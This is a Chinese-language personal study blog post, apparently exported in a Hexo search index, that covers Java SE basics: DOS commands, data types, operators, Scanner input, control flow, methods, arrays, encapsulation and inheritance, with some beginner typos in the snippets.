<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JavaSE</title>
    <url>/2024/08/25/JAVASE/</url>
    <content><![CDATA[<p>最基础的Java语言知识</p>
<span id="more"></span>

<p>基本的dos命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cls 清屏</span><br><span class="line"><span class="keyword">exit</span> 退出</span><br><span class="line">ipconfig 查看本机ip</span><br><span class="line">dir 查看某当前目录文件==ls</span><br><span class="line">md创建文件夹</span><br><span class="line">cd&gt;a.txt文件名即可在当前目录下创建文件</span><br><span class="line">del a.txt删除文件</span><br><span class="line">rd text<span class="comment">//删除目录文件夹</span></span><br></pre></td></tr></table></figure>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>面向对象，跨平台（win，Linux，mac都能运行）<br>三大版本：JavaSE标准版，JavaME，JavaEE</p>
<h2 id="Java大小写敏感"><a href="#Java大小写敏感" class="headerlink" title="Java大小写敏感"></a>Java大小写敏感</h2><h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><p>从上到下一次执行，是基本结构</p>
<h2 id="Java是值传递"><a href="#Java是值传递" class="headerlink" title="Java是值传递"></a>Java是值传递</h2><h1 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h1><p>文件名和类名必须一直，且首字母必须大写<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723839111474-feac2478-ae91-4f53-a284-f6fcfdeb44ba.png#averageHue=%23222428&clientId=u23fecf7a-6254-4&from=paste&height=205&id=uab922ca2&originHeight=307&originWidth=622&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=19448&status=done&style=none&taskId=u666f891c-ab9a-47c7-808b-3463e3adc5e&title=&width=414.6666666666667" alt="image.png"><br>注意方法名大写<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723839374627-5872d1c5-7dd2-4a79-9c3d-5e675b8e6671.png#averageHue=%23faf8f8&clientId=u23fecf7a-6254-4&from=paste&height=644&id=uebced076&originHeight=966&originWidth=1691&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=103019&status=done&style=none&taskId=u0bf80c14-4fad-43cc-897c-780f231922f&title=&width=1127.3333333333333" alt="image.png"><br>在cmd里面编译<code>javac 文件名.java</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723839462942-69393063-ee41-4e32-ba3d-e4d7d4189d25.png#averageHue=%23adb197&clientId=u23fecf7a-6254-4&from=paste&height=644&id=u94b7b565&originHeight=966&originWidth=1691&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1043535&status=done&style=none&taskId=u3cef65b8-7aa9-454c-b6ff-f890d6f59e4&title=&width=1127.3333333333333" alt="image.png"><br><code>java 文件名</code>运行同名的class文件<br>卒，报错，正在尝试使用较新的 Java 版本编译的类文件（版本 65.0），但运行它的 Java Runtime 环境版本较旧（仅支持到版本 52.0），行吧，我就用idea总行了吧<br>Java是一种混合型的编程语言，既有面向对象的特征，也有面向过程的特性。</p>
<h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p>语句以分号结尾<br>ctrl+鼠标左键点击，即可看到方法的用法<br>Ctrl+d快速复制到下一行<br>Ctrl+r全局替换<br>创建空项目<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723841853451-bedc1023-06e7-46a3-9486-5072237393e3.png#averageHue=%232c2f33&clientId=u23fecf7a-6254-4&from=paste&height=866&id=ud3bff701&originHeight=1299&originWidth=1936&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=190048&status=done&style=none&taskId=u64fd5da9-986c-4433-876b-42cbb633cb1&title=&width=1290.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723841978294-9ded9725-8889-451d-b7a9-d7177b3c2901.png#averageHue=%232e3237&clientId=u05788f21-6d8a-4&from=paste&height=556&id=ub6fbdb12&originHeight=834&originWidth=433&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36940&status=done&style=none&taskId=u4543d765-785e-4774-ba38-d7eb19a4650&title=&width=288.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723842059318-cdfc49f0-6c4f-484d-b8f8-776a398662f9.png#averageHue=%232c2e32&clientId=u05788f21-6d8a-4&from=paste&height=861&id=uc0dc4f01&originHeight=1291&originWidth=1539&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=72781&status=done&style=none&taskId=u2fd2e7b2-7e40-4d8f-943c-b076d3d9cc4&title=&width=1026" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723846183934-2454ae19-d190-4835-b21b-3823a47baf2b.png#averageHue=%232d3136&clientId=ue8ddaea2-63de-4&from=paste&height=726&id=u5e8ae2c9&originHeight=1089&originWidth=828&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=121606&status=done&style=none&taskId=u0442de44-47f5-4670-aaa7-cf1220dc427&title=&width=552" alt="image.png"><br>创建一个包，类似于文件夹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723846242748-2ae899bf-130a-47b6-be1b-3d1023597072.png#averageHue=%23242528&clientId=ue8ddaea2-63de-4&from=paste&height=866&id=u97639320&originHeight=1299&originWidth=2082&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=134047&status=done&style=none&taskId=u76c25605-c455-4825-8247-7fa6cb7edbe&title=&width=1388" alt="image.png"><br>文件挪进去之后首行会出现包的名字，这句话不能删除</p>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">注释</span><br><span class="line"><span class="comment">//单行</span></span><br><span class="line"><span class="comment">/*多行注释*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*文本注释</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">注解，有功能的注释</span><br></pre></td></tr></table></figure>
<p>变量命名规则<br>只能以大小写数字，$,下划线_开头（不能以数字开头）不能用关键字命名，可以用中文命名<br>变量必须初始化即赋值后才可以使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//整数</span></span><br><span class="line"><span class="type">byte</span> -<span class="number">128</span>~<span class="number">127</span></span><br><span class="line"><span class="type">short</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="type">long</span> <span class="comment">//long num=30L</span></span><br><span class="line"><span class="comment">//小数</span></span><br><span class="line"><span class="type">float</span> <span class="comment">//float num=50.1F</span></span><br><span class="line"><span class="type">double</span></span><br><span class="line"><span class="comment">//字符，只有一个字</span></span><br><span class="line"><span class="type">char</span></span><br><span class="line"><span class="comment">//字符串,不是关键词，是一个类</span></span><br><span class="line"><span class="comment">//string</span></span><br><span class="line"><span class="comment">//布尔值</span></span><br><span class="line"><span class="type">boolean</span><span class="comment">//true/false</span></span><br><span class="line"><span class="comment">//8位=1字节</span></span><br></pre></td></tr></table></figure>
<p>引用类型：类，接口，数组<br>浮点数数据过大，采用二进制进行比较的时候，会有误差，精度不同比较也是不等</p>
<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">System.out.println((<span class="type">int</span>)c);</span><br><span class="line"><span class="comment">//unicode编码</span></span><br><span class="line"><span class="comment">//U000~UFFF</span></span><br><span class="line"></span><br><span class="line">要避免内存溢出，高到低</span><br><span class="line">不能对布尔值进行转换</span><br><span class="line">自动转换，低到高，不需要括号</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">byte</span> b=(<span class="type">int</span>)a;</span><br></pre></td></tr></table></figure>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ol>
<li>类变量</li>
</ol>
<p>static开头，写在类里面</p>
<ol start="2">
<li>实例变量</li>
</ol>
<p>没有关键字开头，不用初始化<br>会默认初始值：0，0.0，null，false，(u)00000字符串</p>
<ol start="3">
<li>局部变量</li>
</ol>
<p>写在方法里面的</p>
<ol start="4">
<li>常量</li>
</ol>
<p>final关键字，修饰符，不区分前后顺序<br>final 常量名&#x3D;常量值，常量名大写<br><code> static final int PI=3.14;</code><br>驼峰命名：第一个单词小写，后面的单词首字母大写</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">算数运算符</span><br><span class="line">赋值运算符=</span><br><span class="line">关系运算符==</span><br><span class="line">逻辑预算符&amp;&amp;,||,!</span><br><span class="line">位运算符:&amp;,|,^,~,&gt;&gt;,&lt;&lt;,&gt;&gt;&gt;</span><br><span class="line">A&amp;B:二进制，都为<span class="number">1</span>才是<span class="number">1</span></span><br><span class="line">A|B：都是<span class="number">0</span>，才是<span class="number">0</span>，否则为<span class="number">1</span></span><br><span class="line">A^B:相同<span class="number">0</span>，不同<span class="number">1</span>，异或</span><br><span class="line">~B：取反</span><br><span class="line">&lt;&lt; *<span class="number">2</span><span class="comment">//即1往左移位</span></span><br><span class="line">&gt;&gt;/<span class="number">2</span><span class="comment">//1往右减小</span></span><br><span class="line">条件运算符?:</span><br><span class="line">扩展赋值运算符：+=，-=，*=/=</span><br><span class="line">幂运算Math.pow(<span class="number">2</span>,<span class="number">3</span>);<span class="comment">//2^3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串链接</span></span><br><span class="line">System.out.println(a+b);<span class="comment">//输出为数字相加</span></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>a+b);<span class="comment">//输出为ab字符拼接</span></span><br><span class="line">只要有一方是字符，都会转化为字符拼接</span><br></pre></td></tr></table></figure>
<h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><p>本质是文件夹，用于区别命名空间<br>package java.lean&#x2F;&#x2F;分级，必须在第一行<br>import aaa.*;导包，导入所有类，需要在package下面</p>
<h2 id="JDK7特性"><a href="#JDK7特性" class="headerlink" title="JDK7特性"></a>JDK7特性</h2><p>数字之间可以用下划线分割，不会输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> money=<span class="number">10_0000_0000</span></span><br></pre></td></tr></table></figure>
<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><p>Jdk5出现的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个对象用于接受数据</span></span><br><span class="line">        Scanner scanner= <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;<span class="comment">//判断用户是否还有下一个输入</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            System.out.println(word);</span><br><span class="line"></span><br><span class="line">            scanner.close();<span class="comment">//避免占用资源</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723848421190-21f8d84e-8336-4289-b5fe-a9abb47b3942.png#averageHue=%2325282c&clientId=ue8ddaea2-63de-4&from=paste&height=209&id=u4fa7c178&originHeight=314&originWidth=565&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21528&status=done&style=none&taskId=u70e7246f-7824-47a5-be10-a484f39e5ee&title=&width=376.6666666666667" alt="image.png"><br>通过next()和nextLine()输入数据，通过hasNext()和hasNextLine()判断是否有数据输入<br>next()空格会作为结尾，输入有效字符前存在的空白会自动截取掉，nextLine()则以enter结尾<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723848855518-2110d3bb-b8ce-439b-8905-2611cf4ecd79.png#averageHue=%232b2d32&clientId=ue8ddaea2-63de-4&from=paste&height=332&id=u9c163c20&originHeight=498&originWidth=1027&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=93058&status=done&style=none&taskId=u2e69b614-8543-4103-803d-1f7b79847d1&title=&width=684.6666666666666" alt="image.png">可选输入类型</p>
<h2 id="非顺序结构"><a href="#非顺序结构" class="headerlink" title="非顺序结构"></a>非顺序结构</h2><p>if选择语句<br>Switch</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> aaa=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">swich(a)&#123;</span><br><span class="line">    <span class="keyword">case</span><span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">    System.out.printlen(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span><span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">    System.out.printlen(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span><span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">    System.out.printlen(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>swich穿透，没有break会一直往下走<br>从jdk7开始支持字符串了<br>While<br>DoWhile<br>For Jdk5以后出现增强型for循环,呢个够在数组里面进行循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">       <span class="type">int</span>[] numbers = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">           System.out.println(x);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">idea快捷语句<span class="number">5.</span><span class="keyword">for</span>+Tab</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723849949871-9678b499-0870-4737-ac8d-d3939e5f375a.png#averageHue=%23282a2e&clientId=ue8ddaea2-63de-4&from=paste&height=197&id=u4b97a2f5&originHeight=296&originWidth=225&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=10570&status=done&style=none&taskId=u870d9bdb-a130-4285-8511-30e6eeca1b5&title=&width=150" alt="image.png"><br>最终输出</p>
<h2 id="break，continue，goto"><a href="#break，continue，goto" class="headerlink" title="break，continue，goto"></a>break，continue，goto</h2><p>基本相同，避免使用goto语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] numbers = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line">   table:<span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">       System.out.println(x);</span><br><span class="line">       <span class="keyword">if</span>(x%<span class="number">3</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span> table;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="静态与非静态"><a href="#静态与非静态" class="headerlink" title="静态与非静态"></a>静态与非静态</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span>加了就是静态，不加就是非静态，</span><br><span class="line">在同一个类里可以类名.方法名调用</span><br><span class="line"></span><br><span class="line">非静态，要把类实例化之后，才可以类名.方法调用</span><br></pre></td></tr></table></figure>
<p>静态方法是与类一起加载的，而动态方法只有实例化了之后，才存在</p>
<p>类比php，python里面的方法，idea快捷键psvm快速创建一个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> aaa(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">aaa</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类里面不需要提前去声明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名（参数类型，参数名）&#123;</span><br><span class="line">    功能，内容，参数名可有可无</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>形参，实参</p>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>在一个类里面有相同的函数名称，但形参不同的函数，（类型，数量不同）<br>即当返回值类型，或者参数数量，类型不同时，代码能够识别同名方法</p>
<h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><p>运行的时候再传递消息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>; i&lt;args.length; i++)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;args[&quot;</span>+i+<span class="string">&quot;]:&quot;</span>+args[i]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723852019176-c2348221-1388-4c5f-ba45-f967186684ed.png#averageHue=%2334322f&clientId=ue8ddaea2-63de-4&from=paste&height=111&id=udfebb7ec&originHeight=166&originWidth=1497&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149652&status=done&style=none&taskId=u63a1112a-cea8-4aec-a0fc-4e1b7242978&title=&width=998" alt="image.png"></p>
<blockquote>
<p>我的命令行目前跑不了这个，视频里面截的，到时候弄好再换</p>
</blockquote>
<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>Jdk1.5之后，也叫不定项参数<br>再方法声明中，再指定参数类型后加一个省略号<br>一个方法只能指定一个可变参数，它必须是方法的最后一个参数，任何普通方法必须在这之前声明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        main.texxt(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">texxt</span><span class="params">(<span class="type">int</span>...i)</span> &#123;</span><br><span class="line">        System.out.println(i[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723852568319-5c3bfb78-1545-44b6-910a-4e59c8e7588b.png#averageHue=%2324262a&clientId=ue8ddaea2-63de-4&from=paste&height=224&id=u96ef0078&originHeight=336&originWidth=256&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12454&status=done&style=none&taskId=u6f923b75-0d26-4f25-b035-3c7d55e9f55&title=&width=170.66666666666666" alt="image.png">返回值</p>
<h2 id="递归调用"><a href="#递归调用" class="headerlink" title="递归调用"></a>递归调用</h2><p>跟其他的语言差不多，理解递归是什么就可以了</p>
<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>IDEA支持将class文件反编译为能够看的代码，通过idea打开class文件即可</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>是引用类型<br>使用数组必须要先声明数组类型，长度在创建的时候就已经固定了<br>数组对象本身保存在堆中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] nums;<span class="comment">//首选</span></span><br><span class="line"><span class="type">int</span> nums[];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] nums;<span class="comment">//声明数组</span></span><br><span class="line">nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//创建一个数组</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">nums.length可以获得变量长度</span><br><span class="line">赋值nums[<span class="number">0</span>]=<span class="number">1</span>;根据下标找到</span><br><span class="line">默认值时<span class="number">0</span><span class="comment">//就前面说过的默认值</span></span><br></pre></td></tr></table></figure>
<p>数组：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723854028930-a9a324b2-2125-4ca0-ad9b-d0edd9ed8567.png#averageHue=%23f5f5f5&clientId=ue8ddaea2-63de-4&from=paste&height=416&id=u1815b34e&originHeight=624&originWidth=895&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45868&status=done&style=none&taskId=ud4a9e547-01e3-4ffc-8b8e-905d5f74cde&title=&width=596.6666666666666" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//静态初始化：创建+赋值</span></span><br><span class="line"><span class="type">int</span>[] a =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">//引用类初始化</span></span><br><span class="line">Man[] mans =&#123;<span class="keyword">new</span> <span class="title class_">Man</span>(),<span class="keyword">new</span> <span class="title class_">Man</span>()&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="数组打印方法"><a href="#数组打印方法" class="headerlink" title="数组打印方法"></a>数组打印方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pr</span><span class="params">(<span class="type">int</span>[] arry)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arry.length;i++)&#123;</span><br><span class="line">        System.out.print(arry[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="下标越界"><a href="#下标越界" class="headerlink" title="下标越界"></a>下标越界</h2><p>超过区间了<br>int[] num&#x3D;new int[10];<br>当我们访问num[10]时就会报下表越界的错误<br>ArrayIndexOutofBounds</p>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态</span></span><br><span class="line"><span class="type">int</span>[][] nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="comment">//静态</span></span><br><span class="line"><span class="type">int</span>[][] arry=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">arry.length得到的时第一维的数量</span><br></pre></td></tr></table></figure>
<h2 id="Arrys类"><a href="#Arrys类" class="headerlink" title="Arrys类"></a>Arrys类</h2><p>相当于include之后就能调用string方法了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">    System.out.println(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用类打印</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Array.sort(arr)<span class="comment">//自动排序</span></span><br><span class="line">fill赋值</span><br><span class="line">equals<span class="comment">//比较是否相等</span></span><br><span class="line">binarySearch<span class="comment">//二分法查找</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h2><p>就类似于数据结构吧，存储坐标和值，数组下标代表坐标，赋值即为值</p>
<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><p>方便调用，减少重复</p>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>new关键字创建，分配空间，默认初始化，对构造器的调用<br>类里面只有属性和方法</p>
<h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>快捷键Alt+Inert；<br>一个类即使什么都不写，也会存在一个构造器。<br>构造器也称构造方法，实在进行创建对象的时候必须要调用的,特点：必须和类的名字相同，必须没有返回值，也不能写void</p>
<blockquote>
<p>类似于php里面的construct方法，在实例化的时候会调用，new的时候必须要有</p>
</blockquote>
<p>作用：赋给对象初始值</p>
<p>当有一个同名的有参类构造，系统就不会默认生成无参构造，需要自己手动的把无参构造给打出来</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>“高内聚，低耦合”：内部细节自己完成，仅需暴露少量的方法额给外部使用。<br>封装就是属性私有，提供一个公共的方法获取数据<br>private：私有属性<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1724423267450-19b47c92-00f5-435c-a138-c55d262c47fc.png#averageHue=%23202125&clientId=u89f44812-b4f1-4&from=paste&height=510&id=ucc593624&originHeight=765&originWidth=1533&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=123545&status=done&style=none&taskId=ucac42c74-c3c6-4364-b748-e1ffd08335e&title=&width=1022" alt="image.png"><br>输出为20<br>封装能够限制和规范一些用法</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>类和类之间的关系，还有依赖，组合，聚合等<br>父类和子类</p>
<h3 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h3><p>子类继承了父类，就有父类的所有方法<br>private属性无法继承，protected可以继承<br>CTRL+h，可以查看到了的关系树<br>在Java中所有的类都默认继承Object类，只有单继承，没有多继承，类似树的结构</p>
<h3 id="super关键字"><a href="#super关键字" class="headerlink" title="super关键字"></a>super关键字</h3><p>代表父亲的<br>只能出现在子类方法或者构造方法中<br>this能调用自己的成员，super能够调用父亲的<br>子类的构造器会默认调用父类的构造器，显示调用即把隐藏代码super();写出来的话，需要把代码放在子类的第一行<br>如果父类的构造器是有参的话，子类也需要显示的有参调用</p>
<h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>父类不能调用子类独有的方法，要想调用就要强制转换成子类发类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类Father，子类Ch</span><br><span class="line">Father gcc=<span class="keyword">new</span> <span class="title class_">Ch</span>();</span><br><span class="line">((Ch) gcc).get;</span><br></pre></td></tr></table></figure>
<p>重写都是方法的重写，和属性无关。<br>就是继承关系中，当调用子类的方法时，<br>静态方法：<br>方法的调用只和定义的数据类型有关<br>父类的引用指向了子类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类Father，子类Ch</span><br><span class="line">Father gcc=<span class="keyword">new</span> <span class="title class_">Ch</span>();</span><br></pre></td></tr></table></figure>
